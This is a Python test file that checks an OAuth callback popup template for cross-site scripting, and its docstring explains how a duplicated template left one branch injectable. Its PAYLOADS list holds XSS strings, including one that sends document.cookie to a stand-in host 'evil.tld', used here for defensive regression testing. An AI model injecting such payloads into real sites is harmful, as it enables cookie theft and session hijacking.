"""The OAuth callback popup must exist ONCE, and must escape both of its contexts.

Gate round 8, blocker. The dual-context escaping was written for `CALLBACK_HTML` in
netsuite_auth.py while `_MCP_CALLBACK_HTML` in mcp_connectors.py -- a near-verbatim
copy differing only in a <title> and two unused CSS rules -- kept interpolating the
same untrusted values raw across five call sites.

The half-fix was invisible because of how the MCP handler is reached:
`netsuite_mcp_callback` has NO route decorator. Its only caller is
`GET /api/v1/connections/netsuite/callback` (netsuite_auth.py), which delegates to it
for the MCP branch. So hardening "the callback endpoint" hardened one of its two
branches, and the other stayed injectable on the same unauthenticated URL.

Hence the duplicate test below: an escaping rule that lives next to one of two copies
is a rule that will be half-applied again.
"""

from __future__ import annotations

import re
from pathlib import Path

import pytest

from app.api.v1.oauth_callback_page import js_string, render_callback

API_V1 = Path(__file__).resolve().parents[1] / "app" / "api" / "v1"

# The gate's own payloads, plus the classic element-terminator.
PAYLOADS = [
    '"+fetch("//evil.tld?c="+document.cookie)+"',
    '"+alert(document.domain)+"',
    "</script><img src=x onerror=alert(1)>",
    '"><script>alert(1)</script>',
]


@pytest.mark.parametrize("payload", PAYLOADS)
def test_payload_is_inert_in_the_html_body(payload: str):
    rendered = render_callback(
        status="error",
        heading="Authentication Failed",
        message=f"NetSuite returned an error: {payload}",
        event_type="NETSUITE_AUTH_ERROR",
        error_detail=payload,
    )
    assert payload not in rendered, "raw payload reached the HTML body"


@pytest.mark.parametrize("payload", PAYLOADS)
def test_payload_cannot_break_out_of_the_js_string(payload: str):
    rendered = render_callback(
        status="error",
        heading="Authentication Failed",
        message="boom",
        event_type="NETSUITE_AUTH_ERROR",
        error_detail=payload,
    )
    script = rendered.split("<script>", 1)[1]

    # An unescaped `"` would end the literal; an unescaped `</script>` would end the
    # element. Neither may survive into the script body.
    assert "</script><" not in script.replace("</script>\n</body>", "")
    assert f'"{payload}"' not in script, "payload sits unescaped in the JS string"


def test_js_string_supplies_its_own_quotes():
    """The template must not wrap it — double quoting would re-open the literal."""
    assert js_string("x").startswith('"') and js_string("x").endswith('"')


def test_there_is_exactly_one_generic_callback_template_in_the_api():
    """No second copy of the auto-closing popup may reappear.

    Two copies is how the escaping got half-applied: the fix went next to one of them.
    Any new OAuth popup must import `render_callback`, not paste the markup again.

    The discriminator is `postMessage` AND `window.close` together, which is what makes
    a template a copy of the GENERIC popup. ACCOUNT_SWITCHED_HTML also posts a message
    but deliberately never self-closes -- telling somebody their reporting just moved
    NetSuite accounts is not a thing to flash for one second -- so it is a genuinely
    different page, not a duplicate, and is escaped at its own call site.
    """
    offenders = []
    for path in API_V1.glob("*.py"):
        if path.name == "oauth_callback_page.py":
            continue
        for m in re.finditer(r'(\w+)\s*=\s*"""(<!DOCTYPE html>.*?)"""', path.read_text(), re.S):
            body = m.group(2)
            if "postMessage" in body and "window.close" in body:
                offenders.append(f"{path.name}:{m.group(1)}")

    assert offenders == [], (
        f"{offenders} paste their own copy of the auto-closing callback popup — import "
        "render_callback from oauth_callback_page instead, or the next escaping fix "
        "will be half-applied again"
    )


def test_no_api_module_interpolates_error_detail_raw():
    """The literal that made this a blocker: `error: "{error_detail}"` inside <script>."""
    offenders = [p.name for p in API_V1.glob("*.py") if 'error: "{error_detail}"' in p.read_text()]
    assert offenders == [], f"{offenders} interpolate error_detail into a JS string literal raw"
